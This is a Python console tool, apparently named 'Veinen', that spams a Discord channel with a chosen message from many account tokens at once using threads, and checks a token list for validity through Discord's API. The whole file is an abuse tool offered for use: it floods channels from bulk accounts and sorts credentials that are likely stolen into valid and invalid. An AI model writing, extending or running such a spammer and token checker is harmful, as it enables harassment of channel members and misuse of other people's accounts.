import os
import time
import random
import colorama
import requests
import threading
from pystyle import *
from colorama import Fore
import string


red = Fore.RED
yellow = Fore.YELLOW
light_green = Fore.LIGHTGREEN_EX
green = Fore.GREEN
light_green = Fore.LIGHTGREEN_EX
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
os.system("title Veinen By Exploitando")
os.system("cls")


def main_screen():
    user_input = ""
    while True: 
        Write.Print("""                            

 ____   ____  ________  _____  ____  _____  ________  ____  _____  
|_  _| |_  _||_   __  ||_   _||_   \|_   _||_   __  ||_   \|_   _| 
  \ \   / /    | |_ \_|  | |    |   \ | |    | |_ \_|  |   \ | |   
   \ \ / /     |  _| _   | |    | |\ \| |    |  _| _   | |\ \| |   
    \ ' /     _| |__/ | _| |_  _| |_\   |_  _| |__/ | _| |_\   |_  
     \_/     |________||_____||_____|\____||________||_____|\____| 
                                                                   
                          [1] Token Spammer
                          [2] Token Checker

                                                      
                                                     [x] Exit                                        
 """, Colors.red_to_white, interval=0.000)


        Write.Print("                                                    [Made By Exploitando] # ", Colors.red_to_white, interval=0.000)
        choice = input(colorama.Fore.LIGHTGREEN_EX)

        if choice == '1':
            option_1()
        elif choice == '2':
            option_2()
        elif choice == 'x':
            exit(code=104)
        else:
            os.system("cls")


def option_1():
    global msg_sent, msg_failed, msg_ratelimited

    msg_sent = 0
    msg_failed = 0
    msg_ratelimited = 0

    Write.Print("[#] CHANNEL ID: ", Colors.red_to_white, interval=0.001)
    channel_id = input(colorama.Fore.LIGHTGREEN_EX)
    Write.Print("[#] MESSAGE: ", Colors.red_to_white, interval=0.001)
    message_content = input(colorama.Fore.LIGHTGREEN_EX)
    Write.Print("[#] HOW MANY TIMES?: ", Colors.red_to_white, interval=0.001)
    repeat_count = int(input(colorama.Fore.LIGHTGREEN_EX))

    with open("data/tokens.txt", "r") as file:
        tokens = file.read().splitlines()

    def spammer(token):
        global msg_sent, msg_failed, msg_ratelimited  

        url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {'Authorization': token}
        payload = {'content': f'{message_content}'}
        censored_token = token[:-45] + "*********************************************"
        
        for _ in range(repeat_count):
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print(f"{light_green}(+) {light_green} {str(message_content)}{yellow}", censored_token)
                msg_sent += 1
            elif response.status_code == 401:
                print(f"{red}(-)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            elif response.status_code == 429:
                print(f"{yellow}(RATELIMIT)  {str(message_content)}{gray}", censored_token)
                msg_ratelimited += 1
            elif response.status_code == 403:
                print(f"{red}(!)  {str(message_content)}{yellow}", censored_token)
                msg_failed += 1
            else:
                print("ERROR", token)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=spammer, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"{gray}FINISH")
    print(f"{gray}MESSAGES SENT", msg_sent)
    print(f"{gray}MESSAGES NOT SENT:", msg_failed)
    print(f"{gray}MESSAGES NOT SENT (RATELIMIT):", msg_ratelimited)


def option_2():
    def check_token(token):
        headers = {
            'Authorization': token
        }
        response = requests.get('https://discord.com/api/v9/users/@me/affinities/guilds', headers=headers)

        if response.status_code == 200:
            return f"{Fore.GREEN}[VALID] {gray}{token}"
        elif response.status_code == 401:
            return f"{Fore.RED}[INVALID] {gray}{token}"
        elif response.status_code == 403:
            return f"{Fore.YELLOW}[BLOCKED] {gray}{token}"
        else:
            return f"{Fore.RED}Errore sconosciuto: {gray}{token}"

    tokens_file = os.path.join('data', 'tokens.txt')

    with open(tokens_file, 'r') as file:
        tokens = file.readlines()
        if not tokens:
            print("Il file tokens.txt è¨ vuoto.")
        else:
            for token in tokens:
                print(check_token(token.strip()))


if __name__ == "__main__":
    main_screen()
